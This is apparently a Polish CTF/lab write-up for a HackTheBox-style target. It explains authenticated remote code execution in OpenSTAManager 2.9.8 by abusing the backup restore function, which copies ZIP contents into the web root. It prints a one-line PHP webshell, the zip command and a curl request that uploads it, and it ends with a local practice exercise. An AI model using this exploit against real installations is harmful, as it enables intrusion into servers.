# OpenSTAManager — backup restore → RCE

## Kontekst

- Wersja z CSS/assetów: `v=2.9.8` (moduł **Backup** `id_module=7`, **Updates** `id_module=6`).
- Admin w aplikacji ≠ shell; ale moduły backup/update piszą pliki na dysk.

## Restore (authenticated RCE)

Źródło w backupie aplikacji (`src/Backup.php`):

1. Rozpakuj ZIP do katalogu tymczasowego.
2. Opcjonalnie odtwórz `database.sql` (jeśli jest w archiwum).
3. **`copyr($extraction_dir, base_dir())`** — nadpisuje/dodaje pliki w katalogu WWW.
4. `config.inc.php` jest przywracany ze starej kopii (nie tracisz DB credów w config).

Wystarczy mały ZIP **bez** `database.sql`, tylko z webshellem w rootzie aplikacji (np. `an.php`).

```bash
zip evil.zip an.php   # an.php: <?php system($_GET["c"]); ?>

curl -b "$COOKIE" -H 'Host: support_001.enigma.htb' \
  -X POST 'http://<IP>/actions.php?id_module=7' \
  -F 'op=restore' -F 'blob=@evil.zip'
```

- Limit uploadu na UI: ~2M — mały ZIP mieści się.
- Pełny backup z UI (`actions.php?op=backup`) służy do analizy struktury, nie do uploadu.

## Updates (`op=upload`)

- Wymaga pliku `VERSION` w ZIP; przy braku `vendor/` w archiwum update może kończyć się **500** — na tym boxie prostszy był **restore**.

## CSRF

- `disableCSRF = true` w `config.inc.php` ułatwia replay z curl.

## Ćwiczenie

Rozpakuj pobrany backup OpenSTA (`FULL.zip`), znajdź `Backup::restore`, narysuj diagram co jest nadpisywane. Napisz minimalny ZIP i przetestuj na lokalnej instancji PHP w katalogu docroot.